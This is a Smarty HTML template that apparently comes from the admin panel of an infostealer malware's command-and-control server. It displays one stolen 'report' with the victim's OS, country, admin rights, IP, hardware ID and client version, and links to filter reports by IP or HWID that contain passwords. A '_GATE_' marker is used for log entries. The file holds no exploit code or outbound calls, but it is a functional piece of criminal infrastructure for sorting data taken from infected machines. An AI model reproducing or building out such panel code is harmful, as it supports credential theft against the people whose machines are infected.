{assign var='no_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=reports&amp;routine=view_report&amp;report_id={$report_id}"}

{if {$smarty.request.routine|default:''} == 'confirm_delete'}
	{assign var='msg' value="Are you sure you want to delete the report?"}
	{assign var='yes_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=reports&amp;routine=delete&amp;report_id={$report_id}"}
	{include file='confirm.tpl'}
{/if}


{if $report_id != '' && $report_id != '0' && isset($report) && is_array($report)}
	<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?action=reports&amp;routine=download_report&amp;report_id={$report_id}">Download the report</a> ({$report_size|file_size})<br />
	<a class="update_nav" href="{$smarty.server.SCRIPT_NAME}?action=reports&amp;routine=reparse&amp;report_id={$report_id}">Reprocess report</a><br />
	{if $priv_can_delete}
		<a class="delete_nav" href="{$smarty.server.SCRIPT_NAME}?action=reports&amp;routine=confirm_delete&amp;report_id={$report_id}">Delete report</a><br />
	{/if}
<br />
{/if}

{if isset($log_item) && is_array($log_item)}
	<table id="table_view_log" width="800px" cellspacing="0" summary="Log record data">
	<tr><th width="25%">Data on the record in the log</th><th>&nbsp;</th></tr>
	<tr><td>Text</td><td>{$log_item.log_line}</td></tr>
	<tr><td>Additional information</td><td>{$log_item.log_extra}
	{if strstr($log_item.log_line, '_GATE_')}
		(<a href="{$smarty.server.SCRIPT_NAME}?action=log&amp;filter_ip={$log_item.log_extra}&amp;filter_notify=1">Find ip in logs</a> | 
		<a href="{$smarty.server.SCRIPT_NAME}?action=reports&amp;filter_ip={$log_item.log_extra}&amp;filter_has_passwords=1">found reports with ip</a>)
	{/if}
	</td></tr>
	<tr><td>Time added</td><td>{$log_item.import_time}</td></tr>
	{if $log_item.report_id != '0' && $log_item.report_id != ''}
		<tr><td>Отчет</td><td>{$log_item.report_id}</td></tr>
	{/if}
	</table><br />
{else}
	{if {$smarty.request.log_id|default:''} != '' && {$smarty.request.log_id|default:''} != '0'}
		{include file='error.tpl' err_code='ERR_UNK_LOG_ID'}
	{/if}
{/if}

{if isset($report) && is_array($report)}
	<table id="table_view_report" width="800px" cellspacing="0" summary="Report data">
	<tr><th width="25%">Data on report</th><th width="75%">&nbsp;</th></tr>
	<tr><td>ID</td><td>{$report.report_id}</td></tr>
	<tr><td>Size</td><td>{$report.report_len|file_size}</td></tr>
	<tr><td>Processed</td><td>{$report.parsed|yes_no}</td></tr>
	<tr><td>Time added</td><td>{$report.import_time}</td></tr>
	<tr><td>OS</td><td>{$report.report_os_name}</td></tr>
	<tr><td>Country</td><td>{$report.report_country}</td></tr>
	<tr><td>64-bit</td><td>{$report.report_is_win64|yes_no}</td></tr>
	<tr><td>Run with administrator privileges</td><td>{$report.report_admin|yes_no}</td></tr>
	<tr><td>IP</td><td>{$report.report_source_ip} {country base_path="includes/design/images/flags/" country_code=$report.report_source_ip_country_code country_name=$report.report_source_ip_country_name}
	{if ($report.report_source_ip != '')}
		(<a href="{$smarty.server.SCRIPT_NAME}?action=log&amp;filter_ip={$report.report_source_ip}&amp;filter_notify=1">reports with this IP</a> | 
		<a href="{$smarty.server.SCRIPT_NAME}?action=reports&amp;filter_ip={$report.report_source_ip}&amp;filter_has_passwords=1">reports with this hwid and pasw</a>)
	{/if}
	</td></tr>
	<tr><td>HWID</td><td>{$report.report_hwid}
	{if ($report.report_hwid != '')}
		(<a href="{$smarty.server.SCRIPT_NAME}?action=log&amp;filter_hwid={$report.report_hwid}&amp;filter_notify=1">reports with this HWID</a> | 
		<a href="{$smarty.server.SCRIPT_NAME}?action=reports&amp;filter_hwid={$report.report_hwid}&amp;filter_has_passwords=1">reports with hwid and passw</a>)
	{/if}
	</td></tr>
	<tr><td>Client version</td><td>{$report.report_version}</td></tr>
	</table><br />
{else}
	{if {$smarty.request.report_id|default:''} != '' && {$smarty.request.report_id|default:''} != '0'}
	{include file='error.tpl' err_code='ERR_UNK_REPORT_ID'}
	{/if}
{/if}